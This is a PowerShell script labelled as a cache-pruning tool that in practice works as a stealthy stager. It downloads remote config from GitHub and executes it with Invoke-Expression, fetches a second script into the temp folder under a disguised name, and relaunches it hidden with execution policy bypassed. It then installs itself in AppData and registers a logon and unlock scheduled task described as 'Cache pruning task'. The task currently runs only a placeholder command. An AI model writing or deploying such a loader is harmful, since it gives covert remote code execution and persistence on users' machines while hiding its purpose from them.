param(
    [switch]$NoStage,
    [switch]$Uninstall,
    [string]$SourcePath,
    [string]$ConfigFile,
    $Verbose = $false,
    [switch]$Debug
)

# Source config file from GitHub using iex on the file directly. No local storage.
# https://raw.githubusercontent.com/lunndal/goat/refs/heads/main/config.psd1
$configFileName = 'config.psd1'
$configUrl = "https://raw.githubusercontent.com/lunndal/goat/refs/heads/main/$configFileName"

$VerbosePreference = if ([System.Convert]::ToBoolean($Verbose)) { 'Continue' } else { 'SilentlyContinue' }


function Get-Config {
    if ($debug) {
        $localConfigPath = if ($ConfigFile) {
            $ConfigFile
        } else {
            Join-Path -Path $PSScriptRoot -ChildPath $configFileName
        }

        Write-Verbose "Debug mode enabled. Loading config from $localConfigPath"
        return Import-PowerShellDataFile -Path $localConfigPath
    } else {
        Write-Verbose "Debug mode disabled. Loading config from $configUrl"
        return Invoke-Expression (New-Object Net.WebClient).DownloadString($configUrl)
    }
}

function Install-Script {
    $sourceScript = if ($SourcePath) { $SourcePath } else { $PSCommandPath }
    if (-not $sourceScript) {
        throw 'No staged script file is available for -NoStage.'
    }

    Write-Verbose "Using staged script $sourceScript."
    
    # Determine the full path to the target script within the target directory.
    $targetScript = Join-Path -Path $targetDir -ChildPath $scriptName
    if (-not (Test-Path -Path $targetDir)) {
        New-Item -Path $targetDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        Write-Verbose "Created target directory at $targetDir."
    }

    # Copy the staged script to the target directory.
    Copy-Item -Path $sourceScript -Destination $targetScript -Force
    Write-Verbose "Script copied to target location at $targetScript."
    
    # Remove temporary staging files after installation.
    if ($sourceScript -like "$env:TEMP*") {
        Remove-Item -Path $sourceScript -Force -ErrorAction SilentlyContinue
        Write-Verbose "Removed staged script at $sourceScript."
    }
}

function Install-Job {
    # Installs a scheduled task called $config.jobName into the folder $config.appName.
    # The task will run delayed $delay minutes after user logon or unlocking of the screen.
    # If the same task is already running, stop that task. 
    # Stop the task if it runs for more than 5 minutes.
    # Task will execute powershell.exe -NoProfile -Command 'write-output "tjo"'
    $taskPath = "\$($config.appName)\"
    $taskName = $config.jobName
    $delay = [int]$config.startupDelay

    $existingTask = Get-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Stop-ScheduledTask -TaskPath $taskPath -TaskName $taskName -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskPath $taskPath -TaskName $taskName -Confirm:$false
        Write-Verbose "Removed existing scheduled task $taskPath$taskName."
    }

    $service = New-Object -ComObject Schedule.Service
    $service.Connect()
    $rootFolder = $service.GetFolder('\')
    try {
        $folder = $rootFolder.GetFolder($config.appName)
    } catch {
        $folder = $rootFolder.CreateFolder($config.appName)
    }

    $definition = $service.NewTask(0)
    $definition.RegistrationInfo.Description = 'Cache pruning task.'
    $definition.Settings.ExecutionTimeLimit = 'PT5M'
    $definition.Settings.MultipleInstances = 3

    $logonTrigger = $definition.Triggers.Create(9)
    $logonTrigger.Delay = "PT$delay`M"

    $unlockTrigger = $definition.Triggers.Create(11)
    $unlockTrigger.StateChange = 8
    $unlockTrigger.Delay = "PT$delay`M"

    $action = $definition.Actions.Create(0)
    $action.Path = 'powershell.exe'
    $action.Arguments = '-NoProfile -Command ''write-output "tjo"'''

    try {
        $folder.RegisterTaskDefinition($taskName, $definition, 6, $null, $null, 3) | Out-Null
    } catch {
        throw "Failed to register scheduled task $taskPath$taskName. $($_.Exception.Message)"
    }

    Write-Verbose "Installed scheduled task $taskPath$taskName with $delay minute delay."
}

function Stage-Script {
    Write-Verbose "Downloading the latest version of the script from $($config.scriptUrl) to $stagedScript."
    Invoke-WebRequest -Uri $config.scriptUrl -OutFile $stagedScript -UseBasicParsing
    Write-Verbose "Latest version of the script downloaded to $stagedScript."
}

function Start-StagedScript {
    $configFileArgument = if ($ConfigFile) { " -ConfigFile '$ConfigFile'" } else { '' }
    $command = "& ([scriptblock]::Create((Get-Content -Raw -LiteralPath '$stagedScript'))) -NoStage -SourcePath '$stagedScript'$configFileArgument -Verbose:`$false"
    Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-Command', $command)
    Write-Verbose "Started staged script at $stagedScript."
}

function Uninstall-Script {
    if (Test-Path -LiteralPath $targetDir) {
        Remove-Item -LiteralPath $targetDir -Recurse -Force
        Write-Verbose "Removed target directory at $targetDir."
    }

    if (Test-Path -LiteralPath $stagedScript) {
        Remove-Item -LiteralPath $stagedScript -Force
        Write-Verbose "Removed staged script at $stagedScript."
    }
}

#
# Main
#

# Load configuration settings
$config = Get-Config
Write-Verbose "Loaded config settings:`n$($config | Out-String)"


# Determine the script name and path from the configuration.
$scriptName = if ($config.localScriptName) { $config.localScriptName } else { 'cache_2.718281228459045' }
$stagedScript = Join-Path -Path $env:TEMP -ChildPath $scriptName
Write-Verbose "Staged script path: $stagedScript"

# Determine the target directory for the installed script based on the config.
$targetDir = if ($config.targetDir) {
    $config.targetDir
} else {
    Join-Path -Path $env:APPDATA -ChildPath "$($config.interrimPath)\$($config.appName)"
}
Write-Verbose "Target directory for script: $targetDir"

if ($Uninstall) {
    Uninstall-Script
} elseif ($NoStage) {
    Install-Script
} else {
    Stage-Script
    Start-StagedScript
}



Write-Verbose "Cache prune script execution completed."
# Read-Host "Press Enter to exit."